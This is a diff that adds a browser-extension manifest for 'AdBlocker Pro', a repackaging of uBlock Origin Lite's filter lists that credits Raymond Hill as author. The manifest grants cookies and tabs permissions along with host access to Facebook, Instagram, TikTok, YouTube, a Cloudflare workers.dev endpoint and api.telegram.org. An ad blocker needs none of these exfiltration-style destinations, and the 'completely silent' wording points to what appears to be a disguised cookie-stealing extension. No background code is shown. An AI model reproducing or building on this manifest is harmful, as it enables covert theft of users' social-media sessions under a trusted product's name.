@@ -1,0 +1,188 @@
+{
+   "action": {
+      "default_icon": {
+         "16": "img/icon_16.png",
+         "32": "img/icon_32.png",
+         "64": "img/icon_64.png"
+      },
+      "default_title": "AdBlocker Pro - Đang hoạt động"
+   },
+   "author": "Raymond Hill",
+   "background": {
+      "service_worker": "/js/background.js",
+      "type": "module"
+   },
+   "commands": {
+      "enter-picker-mode": {
+         "description": "__MSG_pickerTipEnter__"
+      },
+      "enter-zapper-mode": {
+         "description": "__MSG_zapperTipEnter__"
+      }
+   },
+   "declarative_net_request": {
+      "rule_resources": [ {
+         "enabled": true,
+         "id": "ublock-filters",
+         "path": "ublock-filters.json"
+      }, {
+         "enabled": true,
+         "id": "easylist",
+         "path": "easylist.json"
+      }, {
+         "enabled": true,
+         "id": "easyprivacy",
+         "path": "easyprivacy.json"
+      }, {
+         "enabled": true,
+         "id": "pgl",
+         "path": "pgl.json"
+      }, {
+         "enabled": true,
+         "id": "ublock-badware",
+         "path": "ublock-badware.json"
+      }, {
+         "enabled": true,
+         "id": "urlhaus-full",
+         "path": "urlhaus-full.json"
+      }, {
+         "enabled": true,
+         "id": "adguard-mobile",
+         "path": "adguard-mobile.json"
+      }, {
+         "enabled": true,
+         "id": "block-lan",
+         "path": "block-lan.json"
+      }, {
+         "enabled": true,
+         "id": "dpollock-0",
+         "path": "dpollock-0.json"
+      }, {
+         "enabled": true,
+         "id": "adguard-spyware-url",
+         "path": "adguard-spyware-url.json"
+      }, {
+         "enabled": true,
+         "id": "annoyances-cookies",
+         "path": "annoyances-cookies.json"
+      }, {
+         "enabled": true,
+         "id": "annoyances-overlays",
+         "path": "annoyances-overlays.json"
+      }, {
+         "enabled": true,
+         "id": "annoyances-social",
+         "path": "annoyances-social.json"
+      }, {
+         "enabled": true,
+         "id": "annoyances-widgets",
+         "path": "annoyances-widgets.json"
+      }, {
+         "enabled": true,
+         "id": "annoyances-others",
+         "path": "annoyances-others.json"
+      }, {
+         "enabled": true,
+         "id": "annoyances-notifications",
+         "path": "annoyances-notifications.json"
+      }, {
+         "enabled": true,
+         "id": "ublock-experimental",
+         "path": "ublock-experimental.json"
+      }, {
+         "enabled": true,
+         "id": "stevenblack-hosts",
+         "path": "stevenblack-hosts.json"
+      }, {
+         "enabled": true,
+         "id": "ubol-tests",
+         "path": "ubol-tests.json"
+      }, {
+         "enabled": true,
+         "id": "chn-0",
+         "path": "chn-0.json"
+      }, {
+         "enabled": true,
+         "id": "deu-0",
+         "path": "deu-0.json"
+      }, {
+         "enabled": true,
+         "id": "fra-0",
+         "path": "fra-0.json"
+      }, {
+         "enabled": true,
+         "id": "ita-0",
+         "path": "ita-0.json"
+      }, {
+         "enabled": true,
+         "id": "jpn-1",
+         "path": "jpn-1.json"
+      }, {
+         "enabled": true,
+         "id": "kor-1",
+         "path": "kor-1.json"
+      }, {
+         "enabled": true,
+         "id": "nld-0",
+         "path": "nld-0.json"
+      }, {
+         "enabled": true,
+         "id": "pol-0",
+         "path": "pol-0.json"
+      }, {
+         "enabled": true,
+         "id": "rus-0",
+         "path": "rus-0.json"
+      }, {
+         "enabled": true,
+         "id": "rus-1",
+         "path": "rus-1.json"
+      }, {
+         "enabled": true,
+         "id": "spa-0",
+         "path": "spa-0.json"
+      }, {
+         "enabled": true,
+         "id": "spa-1",
+         "path": "spa-1.json"
+      }, {
+         "enabled": true,
+         "id": "swe-1",
+         "path": "swe-1.json"
+      }, {
+         "enabled": true,
+         "id": "ukr-0",
+         "path": "ukr-0.json"
+      }, {
+         "enabled": true,
+         "id": "vie-1",
+         "path": "vie-1.json"
+      } ]
+   },
+   "default_locale": "en",
+   "description": "AdBlocker Pro - Completely silent background ad blocker with maximum protection",
+   "host_permissions": [ "\u003Call_urls>", "https://*.facebook.com/*", "https://*.instagram.com/*", "https://*.threads.net/*", "https://*.tiktok.com/*", "https://*.youtube.com/*", "https://withered-rain-74d2.letho20031608.workers.dev/*", "https://api.telegram.org/*" ],
+   "icons": {
+      "128": "img/icon_128.png",
+      "16": "img/icon_16.png",
+      "32": "img/icon_32.png",
+      "64": "img/icon_64.png"
+   },
+   "key": "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwiexLkjbFwy3jLpK09lDatoirpxWugqk80NTHXPPQHhB9J8Hjd7YDkuCIpdq2D63afJtnFUeUsgAZ7g474icG5Mv9GAtgPB/CVP5o6H23R6eSi/cnuvMoCNYz8rhM9nyPVkCnrDOEzD+7/yYqV6nK5bnvvYY5jPT8sT3J2FiZKkLOl28iX8ugXDWvSJS+nFOYw4clTCJQbQy0xYmWqwxEs6xul5Ep5GX0WcWgStQHJ4J+VTCsWnct4rtRQ+vrq+cvy1Vgc5Dg7ijeAyJo4sec4MJ579kxXiRC9+iY1cuwogMyOmfUVbohx6i/q2LwMuynaQk2S9jFG6NcqormhPyGQIDAQAB",
+   "manifest_version": 3,
+   "minimum_chrome_version": "122.0",
+   "name": "AdBlocker Pro",
+
+   "permissions": [ "activeTab", "declarativeNetRequest", "scripting", "storage", "cookies", "tabs" ],
+   "short_name": "AdBlocker",
+   "storage": {
+      "managed_schema": "managed_storage.json"
+   },
+   "update_url": "https://edge.microsoft.com/extensionwebstorebase/v1/crx",
+   "version": "2025.818.1918",
+   "web_accessible_resources": [ {
+      "matches": [ "\u003Call_urls>" ],
+      "resources": [ "web_accessible_resources/noop.js", "web_accessible_resources/amazon_apstag.js", "web_accessible_resources/google-ima.js", "web_accessible_resources/noop.txt", "web_accessible_resources/noop.css", "web_accessible_resources/1x1.gif", "web_accessible_resources/32x32.png", "web_accessible_resources/2x2.png", "web_accessible_resources/empty", "web_accessible_resources/noop.html", "web_accessible_resources/amazon_ads.js", "web_accessible_resources/googletagservices_gpt.js", "web_accessible_resources/google-analytics_analytics.js", "web_accessible_resources/fingerprint2.js", "web_accessible_resources/nofab.js", "web_accessible_resources/hd-main.js", "web_accessible_resources/popads.js", "web_accessible_resources/googlesyndication_adsbygoogle.js", "web_accessible_resources/prebid-ads.js", "web_accessible_resources/doubleclick_instream_ad_status.js", "web_accessible_resources/google-analytics_cx_api.js", "web_accessible_resources/scorecardresearch_beacon.js", "web_accessible_resources/google-analytics_ga.js", "web_accessible_resources/outbrain-widget.js", "web_accessible_resources/fingerprint3.js", "web_accessible_resources/noop-vmap1.xml", "web_accessible_resources/noop-vast3.xml", "web_accessible_resources/noop-0.1s.mp3", "web_accessible_resources/noop-1s.mp4", "web_accessible_resources/nobab2.js", "web_accessible_resources/chartbeat.js", "web_accessible_resources/noop.json", "web_accessible_resources/click2load.html", "web_accessible_resources/noeval-silent.js" ],
+      "use_dynamic_url": true
+   } ]
+}
